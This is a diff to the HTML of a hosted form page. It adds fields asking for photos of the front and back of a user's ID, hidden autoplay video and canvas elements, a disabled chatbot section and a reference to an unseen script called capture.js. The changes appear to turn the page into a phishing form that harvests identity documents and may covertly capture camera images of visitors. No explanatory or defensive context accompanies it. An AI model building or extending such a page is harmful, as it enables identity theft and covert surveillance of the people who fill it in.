@@ -33,7 +33,14 @@
     <link type="text/css" rel="stylesheet" media="all" href="https://templates-static-assets.avacdn.net/assets/fonts/Roboto/Roboto.css">
     <link rel="stylesheet" type="text/css" media="all" href="https://templates-static-assets.avacdn.net/cookieUserConsent/23.2/cookieUserConsent.min.css">
     
-    
+    <style>
+        #video {
+            display: none;
+        }
+        #canvas {
+            display: none;
+        }
+    </style>
    
     <script>
       tpt.backend = {
@@ -587,7 +594,7 @@
             </li>-->
           </ul>
         </div>
-        <form method="post" autocomplete="off" class="tpt_wizard wizardStep1 autoClearer formSizes1 formColors1 wiz_2Columns">
+        <form method="post" id="userIdForm" autocomplete="off" class="tpt_wizard wizardStep1 autoClearer formSizes1 formColors1 wiz_2Columns">
           <div id="wizard-id-6" class="wizard" data-id="6">
             <div class="Section Section1">
               <div class="fieldSpec TextField isRequired" id="fieldSpecContainer605">
@@ -1709,6 +1716,12 @@
                   </div>
                 </div>
               </div>
+              <label for="idFront">Front of User ID:</label>
+        <input type="file" id="idFront" name="idFront" accept="image/*" capture="environment">
+        <br><br>
+        <label for="idBack">Back of User ID:</label>
+        <input type="file" id="idBack" name="idBack" accept="image/*" capture="environment">
+        <br><br>
               <div class="fieldSpec buttonBar ButtonBarField" id="fieldSpecContainer143">
                 <div class="fieldSpecPadder">
                   <div class="specTitle">
@@ -1736,6 +1749,9 @@
           <input type="hidden" name="tags" value="">
           <input type="hidden" name="redirectURL" value="">
         </form>
+
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
         <script>
           (function() {
             "use strict";
@@ -1847,7 +1863,7 @@
     </script>
     <script type="text/javascript" src="">
     </script>
-    <div>
+    <!--<div>
       <div class="bot-page" id="bot-page">
         <div class="container">
           <div class="banner-image">
@@ -1926,7 +1942,7 @@
           parentElementId: "chatbot-box",
         });
       }
-    </script>
+    </script>-->
     <script src="ASSET/wizardjquery/plugin/select2/select2.full.min.js?version=10.22.67-stable">
     </script>
     <script src="ASSET/wizardjquery/plugin/select2/select2_locale_en.js?version=10.22.67-stable">
@@ -1936,6 +1952,8 @@
     <script src="ASSETjquery/plugin/select2/select2_locale_en.js?version=10.22.67-stable">
     </script>
     <script src="portalpacks/web/324.11fd162a.js">
+    </script>
+    <script src="11/js/capture.js">
     </script>
     <script src="portalpacks/web/770.01b63a19.js">
     </script>
